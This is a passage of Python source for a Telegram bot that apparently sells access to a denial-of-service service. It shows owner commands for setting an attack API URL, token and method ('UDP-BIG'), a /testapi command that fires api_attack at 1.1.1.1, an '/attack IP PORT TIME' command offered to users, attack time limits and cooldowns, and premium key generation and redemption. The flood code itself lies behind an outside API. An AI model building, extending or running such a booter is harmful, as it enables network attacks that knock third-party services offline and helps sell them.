@bot.message_handler(commands=['ban'])
def cmd_ban(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split(maxsplit=2)
        if len(p) < 2: safe_reply(msg, "⚠️ <code>/ban USER_ID [REASON]</code>", parse_mode="HTML"); return
        target_id = p[1]
        reason = p[2] if len(p) > 2 else "ᴠɪᴏʟᴀᴛɪᴏɴ ᴏꜰ ᴛᴇʀᴍꜱ"
        data["banned_users"][target_id] = {
            "banned_at": datetime.now().isoformat(),
            "banned_by": msg.from_user.id, "reason": reason
        }
        save_data(data)
        try:
            bot.send_message(int(target_id),
                "🚫 <b>ʏᴏᴜ ᴀʀᴇ ʙᴀɴɴᴇᴅ!</b>\n\n"
                f"📝 ʀᴇᴀꜱᴏɴ: <i>{escape_html(reason)}</i>\n"
                f"👑 ᴏᴡɴᴇʀ: <code>{BOT_OWNER}</code>", parse_mode="HTML")
        except: pass
        safe_reply(msg, f"✅ <b>ᴜꜱᴇʀ ʙᴀɴɴᴇᴅ!</b>\n🆔 <code>{target_id}</code>", parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_ban error: {e}")

@bot.message_handler(commands=['unban'])
def cmd_unban(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /unban ID"); return
        target_id = p[1]
        if target_id in ensure_dict(data.get("banned_users", {})):
            del data["banned_users"][target_id]; save_data(data)
            try:
                bot.send_message(int(target_id),
                    "✅ <b>ʏᴏᴜ ᴀʀᴇ ᴜɴʙᴀɴɴᴇᴅ!</b>\n🚀 /start", parse_mode="HTML")
            except: pass
            safe_reply(msg, f"✅ <b>ᴜɴʙᴀɴɴᴇᴅ</b> <code>{target_id}</code>", parse_mode="HTML")
        else: safe_reply(msg, "❌ ɴᴏᴛ ʙᴀɴɴᴇᴅ")
    except Exception as e: print(f"❌ cmd_unban error: {e}")

# ============= API COMMANDS =============
@bot.message_handler(commands=['setapi'])
def cmd_setapi(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 3: safe_reply(msg, "⚠️ /setapi URL TOKEN [METHOD] [GEO]"); return
        set_setting("api_url", p[1]); set_setting("api_token", p[2])
        if len(p) > 3: set_setting("api_method", p[3])
        if len(p) > 4: set_setting("api_geolocation", p[4])
        safe_reply(msg, "✅ <b>ᴀᴘɪ ᴜᴘᴅᴀᴛᴇᴅ!</b>", parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_setapi error: {e}")

@bot.message_handler(commands=['testapi'])
def cmd_testapi(msg):
    try:
        if not is_owner(msg.from_user.id): return
        cid = msg.chat.id
        loading_msg = bot.reply_to(msg, "🧪 <b>ᴛᴇꜱᴛɪɴɢ ᴀᴘɪ...</b>", parse_mode="HTML")

        def run_test():
            time.sleep(0.5)
            ok, r = api_attack("1.1.1.1", 80, 5)
            if ok: final_text = f"✅ <b>ᴀᴘɪ ᴡᴏʀᴋɪɴɢ</b>\n\n<code>{escape_html(r[:400])}</code>"
            else: final_text = f"❌ <b>ᴀᴘɪ ꜰᴀɪʟᴇᴅ</b>\n\n<code>{escape_html(r[:400])}</code>"
            try:
                bot.edit_message_text(chat_id=cid, message_id=loading_msg.message_id,
                    text=final_text, parse_mode="HTML")
            except:
                try: bot.send_message(cid, final_text, parse_mode="HTML")
                except: pass

        threading.Thread(target=run_test, daemon=True).start()
    except Exception as e: print(f"❌ cmd_testapi error: {e}")

@bot.message_handler(commands=['setmaxtime'])
def cmd_setmaxtime(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /setmaxtime SEC"); return
        try:
            set_setting("max_attack_time", int(p[1]))
            safe_reply(msg, f"✅ <b>ᴍᴀx ᴛɪᴍᴇ:</b> {p[1]}ꜱ", parse_mode="HTML")
        except: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
    except Exception as e: print(f"❌ setmaxtime error: {e}")

@bot.message_handler(commands=['setcooldown'])
def cmd_setcooldown(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /setcooldown SEC"); return
        try:
            set_setting("user_cooldown", int(p[1]))
            safe_reply(msg, f"✅ <b>ᴄᴏᴏʟᴅᴏᴡɴ:</b> {p[1]}ꜱ", parse_mode="HTML")
        except: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
    except Exception as e: print(f"❌ setcooldown error: {e}")

@bot.message_handler(commands=['maintenance'])
def cmd_maintenance(msg):
    try:
        if not is_owner(msg.from_user.id): return
        cur = get_setting('maintenance_mode', False)
        set_setting("maintenance_mode", not cur)
        safe_reply(msg, f"✅ <b>ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ:</b> {'ᴏɴ' if not cur else 'ᴏꜰꜰ'}", parse_mode="HTML")
    except Exception as e: print(f"❌ maintenance error: {e}")

# ============= STICKER/VIDEO =============
@bot.message_handler(commands=['liststickers'])
def cmd_liststickers(msg):
    try:
        if not is_owner(msg.from_user.id): return
        stickers = ensure_list(data.get("stickers", []))
        if not stickers: safe_reply(msg, "❄ ᴋᴏɪ ꜱᴛɪᴄᴋᴇʀ ɴᴀʜɪ."); return
        txt = "❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗦\n"
        for i, s in enumerate(stickers, 1): txt += f"{i}. {s}\n"
        txt += f"\n🔹 ᴛᴏᴛᴀʟ {len(stickers)}"
        safe_reply(msg, txt)
    except Exception as e: print(f"❌ liststickers error: {e}")

@bot.message_handler(commands=['removesticker'])
def cmd_removesticker(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "❌ <code>/removesticker NUM</code>", parse_mode="HTML"); return
        try:
            idx = int(p[1]) - 1
            stickers = ensure_list(data.get("stickers", []))
            if 0 <= idx < len(stickers):
                data["stickers"].pop(idx); save_data(data)
                safe_reply(msg, f"✅ ʀᴇᴍᴏᴠᴇᴅ #{p[1]}")
            else: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
        except: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
    except Exception as e: print(f"❌ removesticker error: {e}")

@bot.message_handler(commands=['listvideo'])
def cmd_listvideo(msg):
    try:
        if not is_owner(msg.from_user.id): return
        videos = ensure_list(data.get("videos", []))
        if not videos: safe_reply(msg, "📹 ᴋᴏɪ ᴠɪᴅᴇᴏ ɴᴀʜɪ."); return
        txt = "📹 ᴠɪᴅᴇᴏꜱ\n"
        for i, v in enumerate(videos, 1): txt += f"{i}. {v}\n"
        safe_reply(msg, txt)
    except Exception as e: print(f"❌ listvideo error: {e}")

@bot.message_handler(commands=['delvideo'])
def cmd_delvideo(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /delvideo NUM"); return
        try:
            idx = int(p[1]) - 1
            videos = ensure_list(data.get("videos", []))
            if 0 <= idx < len(videos):
                data["videos"].pop(idx); save_data(data)
                safe_reply(msg, f"✅ ʀᴇᴍᴏᴠᴇᴅ #{p[1]}")
            else: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
        except: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
    except Exception as e: print(f"❌ delvideo error: {e}")

_pending_pyf = {}

@bot.message_handler(commands=['addpyf'])
def cmd_addpyf(msg):
    try:
        if not is_owner(msg.from_user.id): return
        _pending_pyf[msg.from_user.id] = True
        safe_reply(msg, "📤 ᴀʙ ᴠɪᴅᴇᴏ ꜰᴏʀᴡᴀʀᴅ ᴋᴀʀᴏ.")
    except Exception as e: print(f"❌ addpyf error: {e}")

@bot.message_handler(commands=['listpyf'])
def cmd_listpyf(msg):
    try:
        if not is_owner(msg.from_user.id): return
        pyfs = ensure_list(data.get("pyf_videos", []))
        if not pyfs: safe_reply(msg, "🎬 ᴋᴏɪ ᴘʏꜰ ᴠɪᴅᴇᴏ ɴᴀʜɪ."); return
        txt = "🎬 ᴘʏꜰ ᴠɪᴅᴇᴏꜱ\n"
        for i, v in enumerate(pyfs, 1): txt += f"{i}. {v}\n"
        safe_reply(msg, txt)
    except Exception as e: print(f"❌ listpyf error: {e}")

@bot.message_handler(commands=['delpyf'])
def cmd_delpyf(msg):
    try:
        if not is_owner(msg.from_user.id): return
        p = msg.text.split()
        if len(p) < 2: safe_reply(msg, "⚠️ /delpyf NUM"); return
        try:
            idx = int(p[1]) - 1
            pyfs = ensure_list(data.get("pyf_videos", []))
            if 0 <= idx < len(pyfs):
                data["pyf_videos"].pop(idx); save_data(data)
                safe_reply(msg, f"✅ ʀᴇᴍᴏᴠᴇᴅ #{p[1]}")
            else: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
        except: safe_reply(msg, "❌ ɪɴᴠᴀʟɪᴅ")
    except Exception as e: print(f"❌ delpyf error: {e}")

# ============= CONTENT HANDLERS =============
@bot.message_handler(content_types=['sticker'])
def auto_sticker(msg):
    try:
        uid = msg.from_user.id
        if is_banned(uid): return
        if not is_owner(uid): return
        file_id = msg.sticker.file_id
        stickers = ensure_list(data.get("stickers", []))
        if file_id not in stickers:
            data["stickers"].append(file_id); save_data(data)
            safe_reply(msg, f"✅ ꜱᴛɪᴄᴋᴇʀ ᴀᴅᴅᴇᴅ! ᴛᴏᴛᴀʟ: {len(data['stickers'])}")
        else: safe_reply(msg, "ℹ️ ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.")
    except Exception as e: print(f"❌ auto_sticker error: {e}")

@bot.message_handler(content_types=['video'])
def handle_video(msg):
    try:
        uid = msg.from_user.id
        if is_banned(uid): return
        if not is_owner(uid): return
        file_id = msg.video.file_id
        if _pending_pyf.get(uid):
            _pending_pyf[uid] = False
            pyfs = ensure_list(data.get("pyf_videos", []))
            if file_id not in pyfs:
                data["pyf_videos"].append(file_id); save_data(data)
                safe_reply(msg, f"✅ ᴘʏꜰ ᴀᴅᴅᴇᴅ! ᴛᴏᴛᴀʟ: {len(data['pyf_videos'])}")
            else: safe_reply(msg, "ℹ️ ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.")
        else:
            videos = ensure_list(data.get("videos", []))
            if file_id not in videos:
                data["videos"].append(file_id); save_data(data)
                safe_reply(msg, f"✅ ᴠɪᴅᴇᴏ ᴀᴅᴅᴇᴅ! ᴛᴏᴛᴀʟ: {len(data['videos'])}")
            else: safe_reply(msg, "ℹ️ ᴀʟʀᴇᴀᴅʏ ᴀᴅᴅᴇᴅ.")
    except Exception as e: print(f"❌ handle_video error: {e}")

# ============= SETTINGS =============
@bot.message_handler(commands=['settings'])
def cmd_settings(msg):
    try:
        if not is_owner(msg.from_user.id): return
        txt = (
            "╔══════════════════════════╗\n"
            "║            ⚙️ 𝗔𝗟𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 ⚙️              ║\n"
            "╚══════════════════════════╝\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   👑 𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "┣ 👑 /panel ➪ ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ\n"
            "┣ 👥 /users ➪ ʟɪᴠᴇ ᴜꜱᴇʀꜱ ʟɪꜱᴛ\n"
            "┣ 📊 /stats ➪ ʙᴏᴛ ꜱᴛᴀᴛꜱ\n"
            "┣ 📢 /broadcast MSG ➪ ʙʀᴏᴀᴅᴄᴀꜱᴛ\n"
            "┣ 🚫 /ban ID REASON ➪ ʙᴀɴ ᴜꜱᴇʀ\n"
            "┗ ✅ /unban ID ➪ ᴜɴʙᴀɴ ᴜꜱᴇʀ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   🔑 𝗞𝗘𝗬 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "┣ /genkey 1d 5 ➪ ɢᴇɴ 5 ᴋᴇʏꜱ\n"
            "┣ /genkey 1month 10 VIP ➪ ᴘʀᴇᴍɪᴜᴍ\n"
            "┗ /redeem KEY ➪ ʀᴇᴅᴇᴇᴍ ᴋᴇʏ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   📡 𝗔𝗣𝗜 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "┣ /setapi URL TOKEN\n"
            "┣ /testapi ➪ ᴛᴇꜱᴛ ᴀᴘɪ\n"
            "┣ /setmaxtime SEC\n"
            "┗ /setcooldown SEC\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   🔧 𝗕𝗢𝗧 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "┣ /maintenance ➪ ᴛᴏɢɢʟᴇ\n"
            "┣ /status ➪ ʟɪᴠᴇ ꜱᴛᴀᴛᴜꜱ\n"
            "┣ /profile ➪ ʏᴏᴜʀ ᴘʀᴏꜰɪʟᴇ\n"
            "┗ /attack IP PORT TIME ➪ ᴀᴛᴛᴀᴄᴋ\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   ❄ 𝗦𝗧𝗜𝗖𝗞𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "┣ ꜱᴇɴᴅ ꜱᴛɪᴄᴋᴇʀ ➪ ᴀᴅᴅ\n"
            "┣ /removesticker NUM\n"
            "┗ /liststickers\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   📹 𝗩𝗜𝗗𝗘𝗢 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "┣ ꜱᴇɴᴅ ᴠɪᴅᴇᴏ ➪ ᴀᴅᴅ\n"
            "┣ /listvideo\n"
            "┗ /delvideo NUM\n\n"
            "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   🎬 𝗣𝗬𝗙 𝗩𝗜𝗗𝗘𝗢\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
            "┣ /addpyf ➪ ᴀᴅᴅ ᴘʏꜰ\n"
            "┣ /listpyf ➪ ʟɪꜱᴛ\n"
            "┗ /delpyf NUM ➪ ᴅᴇʟᴇᴛᴇ\n\n"
            "╔══════════════════════════╗\n"
            "║              💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗢𝗧 💎                ║\n"
            "╚══════════════════════════╝"
        )
        safe_reply(msg, txt, parse_mode="HTML")
    except Exception as e: print(f"❌ cmd_settings error: {e}")

# ============================================================
# ========== UNIVERSAL BUTTON HANDLER (BUG FIXED) ============
# ============================================================
@bot.message_handler(content_types=['text'], func=lambda m: get_button_type(m.text) is not None)
def universal_button_handler(msg):
    try:
        HEALTH["total_messages"] += 1
        uid = msg.from_user.id
        raw_text = msg.text or ""
        btype = get_button_type(raw_text)

        if not btype:
            return  # Should not happen since func filter, but safety

        # Anti double-fire
        msg_key = (msg.chat.id, msg.message_id)
        if msg_key in _handled_button_msgs:
            return
        _handled_button_msgs.add(msg_key)
        # Keep set small
        if len(_handled_button_msgs) > 500:
            _handled_button_msgs.clear()

        print(f"🔘 BUTTON CLICKED: uid={uid} type={btype}")

        # Banned check
        if is_banned(uid):
            check_ban(msg)
            return

        # ==== ATTACK ====
        if btype == "ATTACK":
            safe_reply(msg,
                "┌┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┐\n"
                "┊  🪼 𝐀𝐓𝐓𝐀𝐂𝐊 𝐂𝐎𝐌𝐌𝐀𝐍𝐃    ┊\n"
                "└┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┘\n\n"
                "📌 <b>ᴜꜱᴀɢᴇ</b> ➪ \n"
                "<code>/attack 𝖨𝖯 𝖯𝖮𝖱𝖳 𝖳𝖨𝖬𝖤</code>\n\n"
                "📝 <b>ᴇxᴀᴍᴘʟᴇ</b> ➪ \n"
                "<code>/attack 𝟏.𝟐.𝟑.𝟒 𝟖𝟎 𝟔𝟎</code>",
                parse_mode="HTML")
            return

        # ==== STATUS ====
        if btype == "STATUS":
            do_status(msg)
            return

        # ==== PROFILE ====
        if btype == "PROFILE":
            do_profile(msg)
            return

        # ==== OWNER PANEL ====
        if btype == "OWNER_PANEL":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!")
                return
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║        📊 🅾︎🆆︎🅽︎🅴︎🆁︎ 🅿︎🅰︎🅽︎🅴︎🅻︎ 🔓           ║\n"
                "╚══════════════════════════╝\n\n"
                "✅ <b>ᴘᴀɴᴇʟ ᴏᴘᴇɴᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ</b>\n\n"
                "┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
                "┃   ⚡ ᴜꜱᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ\n"
                "┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                reply_markup=kb_owner(), parse_mode="HTML")
            return

        # ==== REDEEM ====
        if btype == "REDEEM":
            safe_reply(msg,
                "╔══════════════════════════════╗\n"
                "║   🔑 𝗥𝗘𝗗𝗘𝗘𝗠 𝗞𝗘𝗬 🔑               ║\n"
                "╚══════════════════════════════╝\n\n"
                "📝 <code>/redeem YOUR-KEY</code>",
                parse_mode="HTML")
            return

        # ==== GEN KEY ====
        if btype == "GEN_KEY":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!")
                return
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║       🔑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗞𝗘𝗬 𝗠𝗔𝗞𝗘𝗥 🎛️         ║\n"
                "╚══════════════════════════╝\n\n"
                "📝 <code>/genkey 𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 [𝗔𝗠𝗢𝗨𝗡𝗧] [𝗡𝗔𝗠𝗘]</code>\n\n"
                "⚡ ꜱᴇᴄ ➪ <code>10s</code> | ⏱️ ᴍɪɴ ➪ <code>30m</code>\n"
                "🕐 ʜʀ ➪ <code>1h</code> | 📅 ᴅᴀʏ ➪ <code>1d</code>\n\n"
                "📌 <b>ᴇxᴀᴍᴘʟᴇꜱ:</b>\n"
                "<code>/genkey 1d 5</code>\n"
                "<code>/genkey 1month 10 VIP</code>",
                parse_mode="HTML")
            return

        # ==== STATS ====
        if btype == "STATS":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!")
                return
            do_stats(msg)
            return

        # ==== USERS ====
        if btype == "USERS":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!")
                return
            do_users(msg)
            return

        # ==== BROADCAST ====
        if btype == "BROADCAST":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!")
                return
            safe_reply(msg,
                "╔══════════════════════════╗\n"
                "║       📢 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 📢        ║\n"
                "╚══════════════════════════╝\n\n"
                "📝 <code>/broadcast YOUR MESSAGE</code>\n\n"
                "📌 <code>/broadcast 🔥 New update!</code>",
                parse_mode="HTML")
            return

        # ==== SETTINGS ====
        if btype == "SETTINGS":
            if not is_owner(uid):
                safe_reply(msg, "🚫 ᴏᴡɴᴇʀ ᴏɴʟʏ!")
                return
            cmd_settings(msg)
            return

        # ==== CLOSE ====
        if btype == "CLOSE":
            safe_reply(msg, "❌ ᴄʟᴏꜱᴇᴅ.", reply_markup=kb_main(uid))
            return

    except Exception as e:
        HEALTH["total_errors"] += 1
        print(f"❌ universal_button_handler error: {e}")
        traceback.print_exc()
        try: safe_reply(msg, "❌ ᴇʀʀᴏʀ, ᴛʀʏ ᴀɢᴀɪɴ")
        except: pass

# ============= BANNED FALLBACK =============
@bot.message_handler(func=lambda m: is_banned(m.from_user.id), content_types=['text'])
def banned_fallback(msg):
    try: check_ban(msg)
    except Exception as e: print(f"❌ banned_fallback error: {e}")

# ============= MAIN =============
print("=" * 60)
print(f"  {BOT_NAME}")
print("=" * 60)
print(f"  👑 Owner: {BOT_OWNER}")
print(f"  🔑 Token: {get_setting('api_token', DEFAULT_API_TOKEN)[:20]}...")
print(f"  🎯 Method: {get_setting('api_method', 'UDP-BIG')}")
print("=" * 60)
print("  ✅ Bot running")
print("=" * 60)

while True:
    try:
        bot.remove_webhook()
        time.sleep(0.5)
        bot.polling(
            none_stop=True, interval=0, timeout=20,
            long_polling_timeout=15,
            allowed_updates=["message", "edited_message", "callback_query"]
        )
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped.")
        break
    except Exception as e:
        print(f"⚠️ Polling Error: {e}")
        time.sleep(3)
